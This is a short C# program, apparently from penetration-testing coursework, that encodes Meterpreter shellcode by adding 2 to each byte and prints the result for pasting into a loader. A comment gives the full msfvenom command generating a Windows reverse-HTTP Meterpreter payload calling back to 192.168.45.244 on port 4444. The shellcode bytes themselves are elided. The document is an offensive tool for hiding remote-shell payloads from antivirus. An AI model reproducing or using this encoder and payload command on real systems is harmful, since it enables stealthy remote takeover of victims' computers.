using System;
using System.Text;

class Program
{
      static void Main(string[] args)
    {
        // msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.45.244  LPORT=4444 -f csharp
        byte[] buf = new byte[673] {0xfc, ....};

        byte[] encoded = new byte[buf.Length];
        for (int i = 0; i < buf.Length; i++)
        {
            encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
        }
        uint counter = 0;

        StringBuilder hex = new StringBuilder(encoded.Length * 2);
        foreach (byte b in encoded)
        {
            hex.AppendFormat("{0:D}, ", b);
            counter++;
            if (counter % 50 == 0)
            {
                hex.AppendFormat("_{0}", Environment.NewLine);
            }
        }


        Console.WriteLine("The payload is: " + hex.ToString());
    }
}
